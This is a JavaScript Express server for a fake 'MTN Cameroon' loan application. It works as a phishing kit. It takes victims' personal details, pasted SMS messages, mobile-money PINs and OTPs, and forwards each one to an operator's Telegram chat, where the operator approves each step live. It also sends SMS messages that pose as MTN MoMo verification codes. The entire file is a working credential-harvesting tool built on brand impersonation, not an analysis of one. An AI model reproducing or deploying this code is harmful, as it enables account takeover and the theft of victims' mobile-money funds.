require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
const DEBUG_SMS = process.env.DEBUG_SMS !== 'false';

const applications = {};

function generateId() {
  return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
}
function generateCode(len = 6) {
  return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
}

async function sendTelegramMessage(text, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.log(`[SIMULATED SMS] to ${to}: ${text}`);
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, { to, text }, {
      headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_GATEWAY_API_KEY }
    });
    console.log(`✅ SMS sent to ${to}`);
  } catch (e) {
    console.error('❌ SMS send failed:', e.message);
    console.log(`[FALLBACK SIMULATED SMS] to ${to}: ${text}`);
  }
}

// Routes
app.get('/api/health', (req, res) => res.json({ ok: true }));

// 1. SUBMIT APPLICATION DETAILS (with email)
app.post('/api/submit-application', async (req, res) => {
  const data = req.body.applicationData;
  if (!data || !data.email || !data.phone) {
    return res.status(400).json({ success: false, message: 'Missing required fields' });
  }
  const appId = generateId();
  applications[appId] = {
    ...data,
    appStatus: 'pending',
    smsStatus: 'pending',
    pinStatus: 'pending',
    otpStatus: 'pending',
    smsCode: null,
    otpCode: null,
    smsMessage: null,
    otpEntered: null,
    createdAt: new Date().toISOString()
  };
  const message = `📋 *NEW LOAN APPLICATION*\n\nApp ID: ${appId}\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: +237${data.phone}\nAmount: ${data.loanAmount}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'APP', appId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'APP', appId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true, applicationId: appId });
});

// 2. CHECK APP STATUS
app.get('/api/check-app-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.appStatus });
});

// 3. VERIFY SMS (user pastes SMS, admin approves)
app.post('/api/verify-sms', async (req, res) => {
  const { applicationId, smsMessage } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  app.smsMessage = smsMessage;
  app.smsStatus = 'pending';
  const message = `📨 *SMS MESSAGE RECEIVED*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nSMS Message:\n${smsMessage}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// 4. CHECK SMS STATUS
app.get('/api/check-sms-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.smsStatus });
});

// 5. VERIFY PIN (user enters PIN, admin approves)
app.post('/api/verify-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  app.pinEntered = pin;
  app.pinStatus = 'pending';
  const message = `🔐 *PIN VERIFICATION*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nPIN: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// 6. CHECK PIN STATUS
app.get('/api/check-pin-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.pinStatus });
});

// 7. VERIFY OTP (user enters OTP, admin approves)
app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  app.otpEntered = otp;
  app.otpStatus = 'pending';
  const message = `🔑 *OTP VERIFICATION*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nOTP: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// 8. CHECK OTP STATUS
app.get('/api/check-otp-status/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: app.otpStatus });
});

// 9. RESEND SMS (when timer expires)
app.post('/api/resend-sms', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  const newCode = generateCode(6);
  app.smsCode = newCode;
  await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${newCode}`);
  const message = `🔄 *SMS RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew SMS code: ${newCode}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// 10. RESEND OTP (when timer expires)
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  const newOtp = generateCode(4);
  app.otpCode = newOtp;
  await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo OTP is: ${newOtp}`);
  const message = `🔄 *OTP RESENT*\n\nApp ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew OTP: ${newOtp}\n\nApprove or reject:`;
  const buttons = [[
    { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
    { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
  ]];
  await sendTelegramMessage(message, buttons);
  res.json({ success: true });
});

// 11. DEV SMS CODE (for testing)
app.get('/api/dev-sms-code/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
  if (DEBUG_SMS || !SMS_GATEWAY_URL) {
    return res.json({ success: true, code: app.smsCode, simulated: true });
  }
  res.json({ success: false, simulated: false });
});

// TELEGRAM WEBHOOK (handles approvals)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try { data = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }
    const { a, step, appId } = data;
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    if (step === 'APP') {
      app.appStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.appStatus === 'approved') {
        const smsCode = generateCode(6);
        app.smsCode = smsCode;
        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${smsCode}`);
      }
    } else if (step === 'SMS') {
      app.smsStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.smsStatus === 'approved') {
        // go to PIN stage – nothing to send; PIN is entered by user
      }
    } else if (step === 'PIN') {
      app.pinStatus = a === 'APPROVE' ? 'approved' : 'rejected';
      if (app.pinStatus === 'approved') {
        const otpCode = generateCode(4);
        app.otpCode = otpCode;
        await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo OTP is: ${otpCode}`);
      }
    } else if (step === 'OTP') {
      app.otpStatus = a === 'APPROVE' ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });
    return res.sendStatus(200);
  }
  res.sendStatus(200);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
